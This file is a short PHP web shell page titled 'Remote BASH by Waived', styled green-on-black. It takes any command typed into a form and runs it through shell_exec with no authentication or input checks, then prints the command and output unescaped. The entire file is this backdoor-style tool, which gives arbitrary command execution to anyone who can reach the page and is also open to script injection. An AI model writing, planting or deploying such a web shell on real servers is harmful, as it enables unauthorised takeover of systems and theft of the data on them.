<!DOCTYPE html>
<html>
<head>
    <title>github.com/waived</title>
    <style>
        body {
            font-family: monospace;
            background-color: black;
            color: lime;
        }
        textarea:focus {
            outline: none;
        }
        textarea {
            background-color: green;
            color: lime;
            border: 1px solid lime;
            padding: 1px;
            width: 800px;
            height: 90px;
            resize: both;
            overflow: auto;
        }
        .ui-resizable-handle {
            background-color: lime;
            width: 10px;
            height: 10px;
            border: 2px solid #333;
            cursor: se-resize;
        }
    </style>
</head>
<body>
    <h2>Remote BASH by Waived</h2>
    
    <form method="post" action="<?php echo $_SERVER['PHP_SELF']; ?>">
        <label for="bashCommand">Enter command:</label><br>
        <textarea id="bashCommand" name="bashCommand" rows="5"></textarea><br><br>
        <input type="submit" value="Execute Command">
    </form>
    
    <br>
    <hr style="border-color: green;">
    <h2>Result:</h2>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Retrieve the command from the form input
        $command = $_POST["bashCommand"];

        // Execute the command and capture the output
        $output = shell_exec($command);

        // Display the command and the output
        echo "<p><strong>Command:</strong> $command</p>";
        echo "<pre><code>$output</code></pre>";
    }
    ?>

</body>
</html>
